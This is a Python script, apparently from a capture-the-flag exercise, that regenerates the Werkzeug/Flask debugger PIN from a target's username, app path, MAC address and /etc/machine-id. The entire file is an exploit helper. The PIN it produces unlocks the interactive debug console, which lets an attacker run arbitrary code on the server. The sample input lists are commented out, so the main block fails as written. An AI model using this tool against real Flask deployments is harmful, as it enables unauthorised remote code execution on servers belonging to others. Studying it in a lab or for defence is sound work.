import hashlib
from itertools import chain
# probably_public_bits = [
#     'ctf',# username
#     'flask.app',# modname
#     'Flask',# getattr(app, '__name__', getattr(app.__class__, '__name__'))
#     '/usr/local/lib/python3.11/site-packages/flask/app.py' # getattr(mod, '__file__', None),
# ]

# private_bits = [
#     '2485723348995',# str(uuid.getnode()),  /sys/class/net/ens33/address
#     '6ed8ee97-48c6-487b-bf43-1c32e0d6166d'# get_machine_id(), /etc/machine-id
# ]

def gen_pin(probably_public_bits, private_bits):
    h = hashlib.sha1()
    for bit in chain(probably_public_bits, private_bits):
        if not bit:
            continue
        if isinstance(bit, str):
            bit = bit.encode('utf-8')
        h.update(bit)
    h.update(b'cookiesalt')

    # cookie_name = '__wzd' + h.hexdigest()[:20]

    num = None
    if num is None:
        h.update(b'pinsalt')
        num = ('%09d' % int(h.hexdigest(), 16))[:9]

    rv =None
    if rv is None:
        for group_size in 5, 4, 3:
            if len(num) % group_size == 0:
                rv = '-'.join(num[x:x + group_size].rjust(group_size, '0')
                            for x in range(0, len(num), group_size))
                break
        else:
            rv = num

    return rv

if __name__ == "__main__":
    pin = gen_pin(probably_public_bits, private_bits)
    print(pin)